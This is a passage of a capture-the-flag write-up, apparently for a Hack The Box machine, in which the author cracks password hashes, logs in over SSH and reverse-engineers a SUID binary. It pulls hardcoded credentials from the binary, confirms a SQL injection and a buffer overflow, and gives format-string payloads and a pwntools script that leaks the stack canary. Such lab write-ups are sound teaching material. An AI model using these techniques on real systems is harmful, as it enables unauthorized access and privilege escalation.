+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">124</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">hashes</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">71</span><span class="n">eb1093e10d8f7f4d1eb64fa604e6050f8ad141</span><span class="p">:</span><span class="n">johniscool</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">DhWa3Bym5bj9Ig73wYZRls</span><span class="err">$</span><span class="mi">3</span><span class="n">ecc0c96b090dea7dfa0684b9a1521349170fc93</span><span class="p">:</span><span class="n">john</span> <span class="n">boy</span>
+<span class="n">sha1</span><span class="err">$</span><span class="n">Ri2bP6RVoZD5XYGzeYWr7c</span><span class="err">$</span><span class="mi">4053</span><span class="n">cb928103b6a9798b2521c4100db88969525a</span><span class="p">:</span><span class="n">johnmayer7</span>
+</pre></div>
+<p>All these hashes belong to the <code>Tom</code> user in the databases, so I tried these recovered passwords to switch to Tom on the system. Finally, the password <code>johnmayer7</code> was valid for Tom.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">tom</span><span class="o">@</span><span class="mf">10.10.11.235</span>
+<span class="n">tom</span><span class="o">@</span><span class="mf">10.10.11.235</span><span class="s1">'s password: </span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> 
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span><span class="o">-</span><span class="mi">256</span><span class="n">color</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">source</span> <span class="o">~/.</span><span class="n">bashrc</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>We can read <code>user.txt</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">f2c75</span><span class="o">**********************</span><span class="n">ec4f2</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>As Tom, we lack sudo privileges and don't belong to any interesting groups.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">tom</span><span class="p">:</span> 
+<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">tom</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">drive</span><span class="o">.</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1003</span><span class="p">(</span><span class="n">tom</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1003</span><span class="p">(</span><span class="n">tom</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1003</span><span class="p">(</span><span class="n">tom</span><span class="p">)</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>In Tom's home directory, there's an interesting <code>Set-UID</code> file:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">total</span> <span class="mi">876</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">tom</span>    <span class="mi">719</span> <span class="n">Feb</span> <span class="mi">11</span>  <span class="mi">2023</span> <span class="n">README</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">-</span><span class="n">rwSr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">tom</span> <span class="mi">887240</span> <span class="n">Sep</span> <span class="mi">13</span> <span class="mi">13</span><span class="p">:</span><span class="mi">36</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">tom</span>     <span class="mi">33</span> <span class="n">Feb</span> <span class="mi">17</span> <span class="mi">12</span><span class="p">:</span><span class="mi">01</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>The <code>README.txt</code> file contains information about this binary:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">cat</span> <span class="n">README</span><span class="o">.</span><span class="n">txt</span> 
+<span class="n">Hi</span> <span class="n">team</span>
+<span class="n">after</span> <span class="n">the</span> <span class="n">great</span> <span class="n">success</span> <span class="n">of</span> <span class="n">DoodleGrive</span><span class="p">,</span> <span class="n">we</span> <span class="n">are</span> <span class="n">planning</span> <span class="n">now</span> <span class="n">to</span> <span class="n">start</span> <span class="n">working</span> <span class="n">on</span> <span class="n">our</span> <span class="n">new</span> <span class="n">project</span><span class="p">:</span> <span class="s2">"DoodleGrive self hosted"</span><span class="p">,</span><span class="n">it</span> <span class="n">will</span> <span class="n">allow</span> <span class="n">our</span> <span class="n">customers</span> <span class="n">to</span> <span class="n">deploy</span> <span class="n">their</span> <span class="n">own</span> <span class="n">documents</span> <span class="n">sharing</span> <span class="n">platform</span> <span class="n">privately</span> <span class="n">on</span> <span class="n">thier</span> <span class="n">servers</span><span class="o">...</span>
+<span class="n">However</span> <span class="ow">in</span> <span class="n">addition</span> <span class="k">with</span> <span class="n">the</span> <span class="s2">"new self Hosted release"</span> <span class="n">there</span> <span class="n">should</span> <span class="n">be</span> <span class="n">a</span> <span class="n">tool</span><span class="p">(</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span><span class="p">)</span> <span class="n">to</span> <span class="n">help</span> <span class="n">the</span> <span class="n">IT</span> <span class="n">team</span> <span class="ow">in</span> <span class="n">monitoring</span> <span class="n">server</span> <span class="n">status</span> <span class="ow">and</span> <span class="n">fix</span> <span class="n">errors</span> <span class="n">that</span> <span class="n">may</span> <span class="n">happen</span><span class="o">.</span>
+<span class="n">As</span> <span class="n">we</span> <span class="n">mentioned</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">last</span> <span class="n">meeting</span> <span class="n">the</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span> <span class="ow">and</span> <span class="n">we</span> <span class="n">should</span> <span class="n">test</span> <span class="n">it</span> <span class="n">properly</span><span class="o">...</span>
+<span class="n">We</span> <span class="n">sent</span> <span class="n">the</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">email</span> <span class="k">for</span> <span class="n">every</span> <span class="n">user</span> <span class="n">to</span> <span class="n">help</span> <span class="n">us</span> <span class="ow">in</span> <span class="n">testing</span> <span class="n">the</span> <span class="n">tool</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">better</span><span class="o">.</span>
+<span class="n">If</span> <span class="n">you</span> <span class="n">face</span> <span class="nb">any</span> <span class="n">problem</span><span class="p">,</span> <span class="n">please</span> <span class="n">report</span> <span class="n">it</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="o">.</span>
+<span class="n">Best</span> <span class="n">regards</span><span class="o">.</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p><code>doodleGrive-cli</code> seems to be a tool to monitor server status and fix errors.</p><br/>
+<p>When running this binary, it prompts for a username and password:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> 
+<span class="p">[</span><span class="err">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="err">!</span><span class="p">]</span>
+<span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+<span class="n">asd</span>
+<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">asd</span><span class="p">:</span>
+<span class="n">asd</span>
+<span class="n">Invalid</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="o">.</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>I tried the obtained credentials, but they didn't work.</p><br/>
+<p>Using <code>strings</code>, I displayed printable strings of the binary. Applying filters allowed me to recover a password:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">strings</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">password</span> <span class="o">-</span><span class="n">B</span> <span class="mi">2</span>
+<span class="p">[</span><span class="err">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="err">!</span><span class="p">]</span>
+<span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> 
+<span class="o">--</span>
+<span class="n">findMeIfY0uC</span><span class="nd">@nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="err">!</span>
+<span class="n">Welcome</span><span class="o">...</span><span class="err">!</span>
+<span class="n">Invalid</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="o">.</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>Great, but I also need a username. I applied the same filter with one more line:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="n">strings</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">password</span> <span class="o">-</span><span class="n">B</span> <span class="mi">3</span>
+<span class="n">PATH</span>
+<span class="p">[</span><span class="err">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="err">!</span><span class="p">]</span>
+<span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> 
+<span class="n">moriarty</span>
+<span class="n">findMeIfY0uC</span><span class="nd">@nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="err">!</span>
+<span class="n">Welcome</span><span class="o">...</span><span class="err">!</span>
+<span class="n">Invalid</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="o">.</span>
+<span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p><code>moriarty</code> seems to be the username and <code>findMeIfY0uC@nMr.Holmz!</code> the password.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">tom@drive</span><span class="p">:</span><span class="o">~$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span> 
+<span class="p">[</span><span class="err">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="err">!</span><span class="p">]</span>
+<span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+<span class="n">moriarty</span>
+<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">moriarty</span><span class="p">:</span>
+<span class="n">findMeIfY0uC</span><span class="nd">@nMr</span><span class="o">.</span><span class="n">Holmz</span><span class="err">!</span>
+<span class="n">Welcome</span><span class="o">...</span><span class="err">!</span>
+</pre></div>
+<p>After entering the credentials, it displays a menu:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">doodleGrive</span> <span class="n">cli</span> <span class="n">beta</span><span class="o">-</span><span class="mf">2.2</span><span class="p">:</span> 
+<span class="mf">1.</span> <span class="n">Show</span> <span class="n">users</span> <span class="nb">list</span> <span class="ow">and</span> <span class="n">info</span>
+<span class="mf">2.</span> <span class="n">Show</span> <span class="n">groups</span> <span class="nb">list</span>
+<span class="mf">3.</span> <span class="n">Check</span> <span class="n">server</span> <span class="n">health</span> <span class="ow">and</span> <span class="n">status</span>
+<span class="mf">4.</span> <span class="n">Show</span> <span class="n">server</span> <span class="n">requests</span> <span class="n">log</span> <span class="p">(</span><span class="n">last</span> <span class="mi">1000</span> <span class="n">request</span><span class="p">)</span>
+<span class="mf">5.</span> <span class="n">activate</span> <span class="n">user</span> <span class="n">account</span>
+<span class="mf">6.</span> <span class="n">Exit</span>
+<span class="n">Select</span> <span class="n">option</span><span class="p">:</span>
+</pre></div>
+<p>That's great, but I think it's time to apply some reverse engineering. Let's understand what's going on behind the scenes with <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>.</p><br/>
+<p>This is the main function of <code>doodleGrive-cli</code>:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/27.png"/></p><br/>
+<p>By the way, I'm using the <code>ghidra-dark-theme</code> by <a href="https://github.com/zackelia/ghidra-dark-theme">zackelia</a> in case you're wondering.</p><br/>
+<p>As you can see, here occurs the "authentication":</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/28.png"/></p><br/>
+<p>There is a potential buffer overflow and format string vulnerability. I will explain this after analyzing the code a bit.</p><br/>
+<p>There is an interesting <code>sanitize_string</code> function inspecting my input. Let's see what it's doing:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/29.png"/></p><br/>
+<p>Firstly, <code>param_1</code> represents my input string.</p><br/>
+<p>Here is initializing some variables:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/31.png"/></p><br/>
+<p>The variable <code>local_19</code> has a non-readable value. However, we know that it's in hexadecimal; with Python, we can reverse the process.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python3</span>
+<span class="n">Python</span> <span class="mf">3.10.12</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Nov</span> <span class="mi">20</span> <span class="mi">2023</span><span class="p">,</span> <span class="mi">15</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">05</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mf">11.4.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+<span class="n">Type</span> <span class="s2">"help"</span><span class="p">,</span> <span class="s2">"copyright"</span><span class="p">,</span> <span class="s2">"credits"</span> <span class="ow">or</span> <span class="s2">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">binascii</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="sa">b</span><span class="s2">"5c7b2f7c20270a00"</span><span class="p">))</span>
+<span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">{/| '</span><span class="se">\n\x00</span><span class="s2">"</span>
+<span class="o">&gt;&gt;&gt;</span>
+</pre></div>
+<p>While analyzing the entire function, I noticed it removes the following characters from my string:</p><br/>
+<div class="highlight"><pre><span></span>\
+<span class="p">{</span>
+<span class="o">/</span>
+<span class="p">;</span>
+<span class="o">|</span> 
+<span class="s1">'</span>
+\<span class="n">n</span> <span class="p">(</span><span class="n">LINE</span> <span class="n">FEED</span><span class="p">)</span>
+\<span class="n">x00</span> <span class="p">(</span><span class="n">NULL</span> <span class="n">BYTE</span><span class="p">)</span>
+</pre></div>
+<p>Here is the <code>main_menu()</code> function:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/33.png"/></p><br/>
+<p>After entering the credentials, this menu is displayed. </p><br/>
+<p>While analyzing all functions, I found the <code>activate_user_account()</code> function interesting:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/36.png"/></p><br/>
+<p>Let's examine what this function is doing.</p><br/>
+<p>Firstly, it is defining the variable <code>usernameInput</code> of type char with an allocated buffer of 48 bytes.</p><br/>
+<p>Then, it is defining the variable <code>command</code> of type char with an allocated buffer of 264 bytes.</p><br/>
+<p>It prompts the user to enter a username, and this information will be stored in the <code>usernameInput</code> variable. Then, it checks if the user entered information into the variable; if they simply pressed enter, it will display the message <code>Error: Username cannot be empty.</code></p><br/>
+<p>If the user entered data, the <code>sanitize_string</code> function will be called to sanitize the input. Once the input is "safe", a command will be stored in the <code>command</code> variable:</p><br/>
+<div class="highlight"><pre><span></span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sqlite3</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">DoodleGrive</span><span class="o">/</span><span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span> <span class="o">-</span><span class="n">line</span> \<span class="s1">'UPDATE accounts_customuser SET is_active=1 WHERE username=</span><span class="se">\"</span><span class="si">%s</span><span class="se">\"</span><span class="s1">;</span><span class="se">\'</span>
+</pre></div>
+<p>This program is using format, so <code>%s</code> will be replaced by the value of the <code>usernameInput</code> variable.</p><br/>
+<p>At first glance, even though user input sanitization is being applied, we can see that it is vulnerable to SQL Injection. Since double quotes are not removed in the call to the <code>sanitize_string</code> function, it will allow impacting the query and interacting with the database.</p><br/>
+<p>Let's try to elicit an error during program runtime:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">doodleGrive</span> <span class="n">cli</span> <span class="n">beta</span><span class="o">-</span><span class="mf">2.2</span><span class="p">:</span> 
+<span class="mf">1.</span> <span class="n">Show</span> <span class="n">users</span> <span class="nb">list</span> <span class="ow">and</span> <span class="n">info</span>
+<span class="mf">2.</span> <span class="n">Show</span> <span class="n">groups</span> <span class="nb">list</span>
+<span class="mf">3.</span> <span class="n">Check</span> <span class="n">server</span> <span class="n">health</span> <span class="ow">and</span> <span class="n">status</span>
+<span class="mf">4.</span> <span class="n">Show</span> <span class="n">server</span> <span class="n">requests</span> <span class="n">log</span> <span class="p">(</span><span class="n">last</span> <span class="mi">1000</span> <span class="n">request</span><span class="p">)</span>
+<span class="mf">5.</span> <span class="n">activate</span> <span class="n">user</span> <span class="n">account</span>
+<span class="mf">6.</span> <span class="n">Exit</span>
+<span class="n">Select</span> <span class="n">option</span><span class="p">:</span> <span class="mi">5</span>
+<span class="n">Enter</span> <span class="n">username</span> <span class="n">to</span> <span class="n">activate</span> <span class="n">account</span><span class="p">:</span> <span class="s2">"test</span>
+<span class="n">Activating</span> <span class="n">account</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">'"test'</span><span class="o">...</span>
+<span class="n">Error</span><span class="p">:</span> <span class="n">near</span> <span class="s2">"test"</span><span class="p">:</span> <span class="n">syntax</span> <span class="n">error</span>
+</pre></div>
+<p>As you can see, I triggered an error when entering <code>"test</code> as the username, thus confirming the SQL Injection.</p><br/>
+<h3>Buffer Overflow</h3><br/>
+<p>Upon resolving this machine for the first time, I exploited the SQL Injection using SQLite's <code>load_extension</code> method, enabling me to import a malicious library and execute any command I wanted. While it provided a faster route to root, I believe the intended method for this machine is exploiting the Buffer Overflow. Therefore, I will explain this vulnerability and how to exploit it in <code>doodleGrive-cli</code>.</p><br/>
+<p>A buffer overflow is a security vulnerability that occurs when more data is written than a specific storage area, such as a buffer, can contain. This can lead to additional data overwriting adjacent memory areas, resulting in unexpected behaviors or allowing the execution of malicious code.</p><br/>
+<p>In normal situations, programs allocate a memory space to store temporary data, such as variables or strings. When a buffer overflow occurs, the inputted data exceeds the size of the previously allocated buffer, and the excess may overwrite adjacent data in memory, including return addresses for functions.</p><br/>
+<p>Attackers can exploit this vulnerability by overwriting crucial data in memory, such as return addresses, to redirect the program's execution toward injected malicious code, thereby achieving the execution of unauthorized commands.</p><br/>
+<p>Firstly, we need to understand binary protections. This information is crucial because there are different methods to exploit buffer overflow depending on the protections enabled.</p><br/>
+<p>To do this, we can use the <code>checksec</code> command:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">checksec</span> <span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/elswix/Desktop/elswix/HTB/Drive/content/doodleGrive-cli'</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
+</pre></div>
+<p>Let's explain these protections. As we can see, the NX and Stack Canary protections are enabled, but what do they mean?</p><br/>
+<h3>NX</h3><br/>
+<p>Binary NX (No eXecute) protection is a security measure that prevents designated memory areas, including the stack, from running code. In other words, it prevents data stored in certain memory regions from being executed as instructions. This helps prevent attacks attempting to execute malicious code stored in memory areas that should only contain data.</p><br/>
+<h3>Stack Canary</h3><br/>
+<p>Stack Canary protection is a security measure used to detect and prevent buffer overflow attacks, especially those attempting to manipulate the execution flow by manipulating the stack.</p><br/>
+<p>It involves placing a unique value, known as a "canary", between local variables and control data on the execution stack. Before exiting a function, it checks whether this canary value has been modified. If it has been altered, it is assumed that a buffer overflow has occurred, and a defensive action, such as terminating the program, can be taken.</p><br/>
+<p>This protection helps prevent attacks that try to overwrite return addresses or other crucial data on the stack. By introducing a unique canary value that must remain intact, it makes it challenging for attackers to manipulate the stack successfully without being detected.</p><br/>
+<p>The canary is generated in this section of code within the <code>main</code> function:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/37.png"/></p><br/>
+<p>The canary check protection is performed in the following section of the <code>main</code> function:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/38.png"/></p><br/>
+<p>It checks whether the generated canary value is equal to a section of memory.</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/39.png"/></p><br/>
+<p>To exploit this buffer overflow vulnerability, we will need to leak the <code>canary</code> value. Without knowledge of its value, the exploit will fail.</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/41.png"/></p><br/>
+<p>The buffer overflow vulnerability is present in line <code>24</code>. As you can observe, it reads 400 bytes from stdin (user input) and stores them in the <code>local_48</code> variable. The issue here is that <code>local_48</code> was defined with a buffer size of <code>56</code> bytes:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/42.png"/></p><br/>
+<p>There is also a format string vulnerability on line 22:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/41.png"/></p><br/>
+<p>Since <code>local_58</code> stores data from user input on line <code>19</code>.</p><br/>
+<p>The printf format string vulnerability occurs when the printf function (or related functions) is improperly used, allowing an attacker unauthorized access to memory or sensitive information. The vulnerability arises when the format string passed as an argument to printf does not properly match the provided arguments.</p><br/>
+<p>Instead of providing specific arguments for each format specifier in the format string, attackers can exploit this vulnerability by supplying a malicious format string containing format specifiers without corresponding arguments. This can lead to leakage of sensitive data stored in memory or even arbitrary code execution.</p><br/>
+<p>You can read this <a href="https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/">article</a> for more examples.</p><br/>
+<p>The format string vulnerability occurs when entering a username. Let's attempt to input some malicious data:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">doodleGrive</span><span class="o">-</span><span class="n">cli</span>
+<span class="p">[</span><span class="err">!</span><span class="p">]</span><span class="n">Caution</span> <span class="n">this</span> <span class="n">tool</span> <span class="n">still</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">development</span> <span class="n">phase</span><span class="o">...</span><span class="n">please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">issue</span> <span class="n">to</span> <span class="n">the</span> <span class="n">development</span> <span class="n">team</span><span class="p">[</span><span class="err">!</span><span class="p">]</span>
+<span class="n">Enter</span> <span class="n">Username</span><span class="p">:</span>
+<span class="o">%</span><span class="mi">1</span><span class="err">$</span><span class="n">li</span>
+<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="mi">16</span><span class="p">:</span>
+<span class="n">a</span>
+<span class="n">Invalid</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="o">.</span>
+</pre></div>
+<p>I entered <code>%1$li</code> as the username; essentially, this means:</p><br/>
+<p><code>%</code>: Indicates the start of a format specifier.</p><br/>
+<p><code>1$</code>: Specifies that the argument to be printed comes from the first argument passed to printf (after the format string).</p><br/>
+<p><code>li</code>: Indicates that the argument will be printed as an integer number in long format.</p><br/>
+<p>In this case, it returns 16, since <code>0x10</code> (16 in hexadecimal) is the first argument passed to printf.</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/hard/drive/img/43.png"/></p><br/>
+<p>This vulnerability will allow us to leak the <code>canary</code> address. If we manage to read the data in the stack canary, we can send it back to the program later because the canary remains constant throughout the execution.</p><br/>
+<p>Firstly, to obtain it, we have to perform some brute force using the Format String Vulnerability.</p><br/>
+<p>When we entered <code>%1$li</code>, we specified that we wanted to extract the first argument (after the format string) passed to printf in a long integer format. If we enter more than <code>1</code> argument, as printf only had one argument, we will leak some other sections of the memory. This means that we could gain access to the <code>canary</code> through this method.</p><br/>
+<p>Identifying the <code>canary</code> will be simple, as it always ends in a NULL byte (00), and its value is completely random. Therefore, we won't confuse the canary with libc and stack addresses that start with <code>f7</code> and <code>ff</code>.</p><br/>
+<p>The following exploit will perform a brute force attack to leak 100 sections of memory:</p><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">101</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./doodleGrive-cli"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">"%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">$lx"</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> -&gt;"</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</pre></div>
+<p>Note that this time we are leaking these values in hexadecimal format.</p><br/>
